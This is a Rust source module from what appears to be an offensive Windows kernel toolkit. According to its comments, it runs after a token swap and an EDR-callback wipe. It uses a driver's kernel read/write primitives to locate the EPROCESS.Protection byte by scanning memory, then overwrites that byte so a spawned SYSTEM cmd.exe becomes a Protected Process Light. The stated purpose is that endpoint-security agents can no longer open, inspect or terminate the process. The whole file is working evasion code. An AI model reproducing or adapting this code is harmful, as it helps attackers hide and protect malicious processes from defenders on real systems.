//! Post-swap process-protection elevation (turn the spawned cmd.exe into PPL).
//!
//! After the token swap and the EDR-callback wipe, the SYSTEM cmd.exe is
//! still an unprotected process. Patching its `EPROCESS.Protection` byte
//! promotes it to Protected Process Light so no unprotected (or lower-signer)
//! process can `OpenProcess` / `WriteProcessMemory` / `TerminateProcess` it —
//! including whatever userland EDR agent survives the callback wipe.
//!
//! The `Protection` byte is a `_PS_PROTECTION`:
//!   bits 0-2  Type     (0=None, 1=ProtectedLight, 2=Protected)
//!   bit  3    Audit
//!   bits 4-7  Signer   (0=None, 3=Antimalware, 5=Windows, 6=WinTcb, 7=WinSystem)
//!
//! Its offset drifted heavily in the Win11 24H2 EPROCESS reshuffle, so we
//! resolve it dynamically at runtime by scanning a plausible window where the
//! System EPROCESS shows the invariant `PsProtectedSignerWinSystem-Protected`
//! (0x72) and the reference unprotected EPROCESS shows 0x00.

use crate::astra::Astra;
use crate::kernel::{find_eprocess_by_ptwalk, vread, vwrite};

/// PS_PROTECTION encodings we care about. Bytes are `(Signer<<4)|(Audit<<3)|Type`.
pub const PS_PROTECTED_WINSYSTEM:         u8 = 0x72; // Signer=WinSystem,  Type=Protected      (System EPROCESS)
pub const PS_PROTECTED_WINTCB:            u8 = 0x62; // Signer=WinTcb,     Type=Protected      (full PP)
pub const PS_PROTECTED_WINTCB_LIGHT:      u8 = 0x61; // Signer=WinTcb,     Type=ProtectedLight (PPL)
pub const PS_PROTECTED_ANTIMALWARE_LIGHT: u8 = 0x31; // Signer=Antimalware Type=ProtectedLight (Defender/EDR PPL)

/// Human-readable label for a PS_PROTECTION byte, for logging.
pub fn label(v: u8) -> String {
    let ty = match v & 0x7 { 0 => "None", 1 => "PPL", 2 => "PP", _ => "?" };
    let sg = match (v >> 4) & 0xF {
        0 => "None", 3 => "Antimalware", 5 => "Windows",
        6 => "WinTcb", 7 => "WinSystem", _ => "?",
    };
    format!("{sg}-{ty} (0x{v:02X})")
}

/// Locate `EPROCESS.Protection` by scanning a window where System has 0x72 and
/// the reference (our unprotected launcher, before or after the token swap —
/// swap changes Token, not Protection) has 0x00. Returns offset from EPROCESS
/// base. When multiple candidates match we take the highest offset, because
/// Protection lives past the identity/link/token region rather than at the
/// start of the struct.
fn find_protection_offset(
    drv: &Astra, cr3: u64, sys_eproc_va: u64, ref_eproc_va: u64,
) -> Result<u64, String> {
    const START: u64 = 0x300;
    const END:   u64 = 0xA00;
    let len = (END - START) as usize;

    let mut sys_buf = vec![0u8; len];
    let mut ref_buf = vec![0u8; len];
    vread(drv, cr3, sys_eproc_va + START, &mut sys_buf)?;
    vread(drv, cr3, ref_eproc_va + START, &mut ref_buf)?;

    // Adjacent bytes SignatureLevel / SectionSignatureLevel precede Protection.
    // For System both are small (< 0x20). For an unprotected launcher they are
    // 0. Requiring the -1 byte to be low sharply narrows random 0x72 hits.
    let mut chosen: Option<u64> = None;
    for i in 1..len {
        if sys_buf[i] == PS_PROTECTED_WINSYSTEM
            && ref_buf[i] == 0x00
            && sys_buf[i - 1] <= 0x1F
            && ref_buf[i - 1] == 0x00
        {
            chosen = Some(START + i as u64);
        }
    }
    // Relaxed pass if the strict predicate rejected everything on this build.
    if chosen.is_none() {
        for i in 0..len {
            if sys_buf[i] == PS_PROTECTED_WINSYSTEM && ref_buf[i] == 0x00 {
                chosen = Some(START + i as u64);
            }
        }
    }
    chosen.ok_or_else(|| "EPROCESS.Protection offset not located".into())
}

fn read_byte(drv: &Astra, cr3: u64, va: u64) -> Result<u8, String> {
    let mut b = [0u8; 1];
    vread(drv, cr3, va, &mut b)?;
    Ok(b[0])
}

/// Elevate the process with `target_pid` to the given `protection` byte.
/// Returns `(offset, old_protection)` so the caller can log the transition.
pub fn elevate_pid(
    drv: &Astra, cr3: u64, nt_kbase: u64,
    sys_eproc_va: u64, ref_eproc_va: u64,
    target_pid: u32, protection: u8,
) -> Result<(u64, u8, u64), String> {
    let (_sys, target_eproc_va) = find_eprocess_by_ptwalk(drv, cr3, nt_kbase, target_pid)?;
    let off = find_protection_offset(drv, cr3, sys_eproc_va, ref_eproc_va)?;

    let old = read_byte(drv, cr3, target_eproc_va + off)?;
    vwrite(drv, cr3, target_eproc_va + off, &[protection])?;
    let now = read_byte(drv, cr3, target_eproc_va + off)?;
    if now != protection {
        return Err(format!(
            "Protection write did not stick: read back 0x{:02X}, wanted 0x{:02X}",
            now, protection
        ));
    }
    Ok((off, old, target_eproc_va))
}
